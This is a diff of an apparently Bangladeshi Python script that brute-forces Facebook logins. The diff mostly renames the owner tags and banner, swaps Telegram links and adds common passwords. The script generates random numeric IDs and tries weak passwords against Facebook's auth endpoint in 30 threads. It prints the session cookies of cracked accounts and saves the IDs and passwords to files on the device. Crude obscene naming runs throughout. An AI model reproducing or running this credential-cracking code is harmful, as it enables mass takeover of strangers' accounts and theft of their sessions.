@@ -1,9 +1,8 @@
-#OWNER ASIF #FUCK_XX
-#mosabbirold_FUCK_XNX #FUCK_XX
-#GIFT BY ASIF #FUCK_XX
-#OPENED BY ASIF #FUCK_XX
-#HELP BY SIKRA NIKNAME(H41N4)
-#GIFT BY MOSABBIR
+#OWNER MOSABBIR #FUCK_XX
+#MOSABBIR_FUCK_XNX #FUCK_XX
+#GIFT BY MOSABBIR #FUCK_XX
+#OPENED BY MOSABBIR #FUCK_XX
+#HELP BY MOSABBIR NIKNAME(H41N4)
 import os, sys, json, uuid, string, random, requests
 from concurrent.futures import ThreadPoolExecutor
 import os, sys, json, uuid, string, random, requests
@@ -48,18 +47,17 @@ def ____banner____():
     else:os.system("clear")
     print(f"""\033[1;32m
     
-
-  __  __                 _     _     _      
- |  \/  |               | |   | |   (_)     
- | \  / | ___  ___  __ _| |__ | |__  _ _ __ 
- | |\/| |/ _ \/ __|/ _` | '_ \| '_ \| | '__|
- | |  | | (_) \__ \ (_| | |_) | |_) | | |   
- |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|    '  V/1.1
+___  ___                _     _     _       
+|  \/  |               | |   | |   (_)      
+| .  . | ___  ___  __ _| |__ | |__  _ _ __  
+| |\/| |/ _ \/ __|/ _` | '_ \| '_ \| | '__| 
+| |  | | (_) \__ \ (_| | |_) | |_) | | |    
+\_|  |_/\___/|___/\__,_|_.__/|_.__/|_|_| '  V/1.1
 \n---------------------------------
-[âœª] OWNER      : MOSABBIR 
-[âœª] DEVELOPER  : MOSABBIR
-[âœª] STATUS     : PRIVATE  [+] V/1.1
-[âœª] TOOLS      : OLD & RANDOM & FILE
+[✪] OWNER      : MOSABBIR 
+[✪] DEVELOPER  : MOSABBIR HOSSAIN 
+[✪] STATUS     : PRIVATE  [+] V/1.1
+[✪] TOOLS      : OLD & RANDOM & FILE
 ---------------------------------""")
     
 #______________MAIN DEF_______________#
@@ -73,7 +71,7 @@ def main():
     print("-------------------------------")
     select = input("SELECT OPTION : ")
     if select == "3":
-        fuckMyxmosabbirold("100000")
+        fuckMyxmosabbir("100000")
     if select == "2":
     	print(" FUCK RANDOM")
     if select == "1":
@@ -88,7 +86,7 @@ def main():
         
 #______________OLD DEF_______________#
 
-def fuckMyxmosabbirold(series):
+def fuckMyxmosabbir(series):
     ____banner____()
     os.system("xdg-open https://t.me/mosabbirhossainsajib")
     global gen
@@ -99,8 +97,8 @@ def fuckMyxmosabbirold(series):
         SEX = "100000"
         SEX2 = 9
     for a in range(99999):
-        mosabbirold = "".join(random.choice(string.digits) for _ in range(SEX2))
-        gen.append(mosabbirold)
+        mosabbir = "".join(random.choice(string.digits) for _ in range(SEX2))
+        gen.append(mosabbir)
     with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
         ____banner____()
         print("TOTAL IDS - "+str(len(gen)))
@@ -109,7 +107,7 @@ def fuckMyxmosabbirold(series):
         print("-------------------------------")
         for love in gen:
             ids = SEX + love
-            passlist = ["123456", "1234567", "12345678", "123456789"," 000000","1234567890"]
+            passlist = ["123456", "1234567", "12345678", "123456789"," iloveyou","1234567890","135790","Bangladesh"]
             Fuck_xnxx.submit(Fucking_life, ids, passlist)
     sys.exit("\n-------------------------------")
     
@@ -117,7 +115,7 @@ def fuckMyxmosabbirold(series):
 
 def Fucking_life(ids, passlist):
     global loop, oks, cps
-    sys.stdout.write(f"\MOSABBIR [{loop}]|OK:[{len(cps)}]")
+    sys.stdout.write(f"\r😍💎MOSABBIR [{loop}]|OK:[{len(cps)}]")
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -126,12 +124,12 @@ def Fucking_life(ids, passlist):
             url = "https://b-api.facebook.com/auth/login"
             response = requests.post(url, data=data, headers=head, verify=True).json()
             if "access_token" in response:
-                print(f"\r\r\x1bmosabbirold_H41N4-OK | {ids} â€¢ {pas}")
-                open("/sdcard/mosabbirold-OK.txt", "a").write(ids + "|" + pas + "\n")
+                print(f"\r\r\x1bmosabbir_H41N4-OK | {ids} • {pas}")
+                open("/sdcard/mosabbir-OK.txt", "a").write(ids + "|" + pas + "\n")
                 oks.append(ids)
                 break
             elif "www.facebook.com" in response.get("error", {}).get("message", ""):
-                print(f"\r\r\x1bAROOTðŸ’ŽMOSABBIRðŸ’ŽOK | {ids} â€¢ {pas}")
+                print(f"\r\r\x1bA😍💎MOSABBIR💎OK | {ids} • {pas}")
                 open("/sdcard/mosabbir-OK.txt", "a").write(ids + "|" + pas + "\n")
                 cps.append(ids)
                 break
@@ -140,12 +138,13 @@ def Fucking_life(ids, passlist):
         pass
         
 #______________RANDDOM DEF_______________#
+#===========FUCK RANDOM==============#
 {"""
 def FUCK_XNXXX():
     user=[]
     clear()
     ____banner____()
-    os.system("xdg-open https://t.me/mosabbirhossainsajib")
+    os.system("xdg-open https://t.me/asif_tricker95")
     print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
     code=input(' ENTER SIM CODE >> ')
     
@@ -187,7 +186,7 @@ def FUCK_FRIEND(ids,passlist):
     global loop
     try:
         for pas in passlist:
-            sys.stdout.write(f'\r\x1b[[\x1b[â‚³Ó¾â‚¦_â‚µâ±¤â‚³â‚µâ‚­\x1b[]\x1b[-\x1b[[[{loop}\x1b[]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK-{len(oks)}\x1b[]')
+            sys.stdout.write(f'\r\x1b[[\x1b[₳Ӿ₦_₵Ɽ₳₵₭\x1b[]\x1b[-\x1b[[[{loop}\x1b[]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK-{len(oks)}\x1b[]')
             sys.stdout.flush()
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
@@ -203,15 +202,15 @@ def FUCK_FRIEND(ids,passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m[MOSABBIR-ACTIVE] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m[Mosabbir-ACTIVE] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
-                    print('\033[3;34m [COOKIE_â‡ï¸] '+coki)
-                    open('/sdcard/MOSABBIR-ACTIVE.txt','a').write(str(uid)+' | '+pas+'\n')
+                    print('\033[3;34m [COOKIE_❇️] '+coki)
+                    open('/sdcard/Mosabbir-ACTIVE.txt','a').write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;35m[MOSABBIR-INCTIVE] '+ids+' | '+pas+'\033[1;37m')
-                open('/sdcard/MOSABBIR-INCTIVE.txt','a').write(ids+'|'+pas+'\n')
+                print('\r\r \033[1;35m[Mosabbir-INCTIVE] '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/Mosabbir-INCTIVE.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
